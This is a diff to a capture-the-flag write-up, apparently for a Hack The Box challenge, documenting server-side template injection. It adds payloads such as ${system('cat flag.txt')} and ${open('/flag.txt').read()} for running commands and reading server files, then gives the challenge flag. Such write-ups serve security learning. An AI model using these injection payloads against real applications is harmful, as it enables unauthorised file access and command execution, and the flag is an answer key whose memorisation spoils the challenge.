@@ -26,17 +26,43 @@ Could you help bring down this application?
 ![image](https://user-images.githubusercontent.com/70703371/209550550-5670a127-78d8-4535-8505-92be6b862090.png)
 
 
-4. Let's try to input addition.
+4. Let's try to input addition. | ${1+3}
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209550842-6ea4c1dc-368a-408a-b33a-92e18ca85414.png)
+![image](https://user-images.githubusercontent.com/70703371/209551500-dfbe3c18-04e6-4de8-974a-33c41024f06b.png)
 
 
-5. Based from the result we got, we can conclude that the website is vuln to **SSTI**.
+5. Based from the result we got, we can suggest that the website is vuln to **SSTI**.
+6. Let's input another payload.
+
+```
+${system('cat flag.txt')}
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209551600-f274c144-a0f5-4d87-bf35-e27e149b44d0.png)
 
 
+7. Hmm.. try this one now:
 
+```php
+${open('/flag.txt').read()}
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209551922-8ac5bd58-36cc-4715-81b0-1f000781c9cb.png)
+
+
+8. Got the flag!
+
+## FLAG
+
+```
+HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
+```
 
 
 
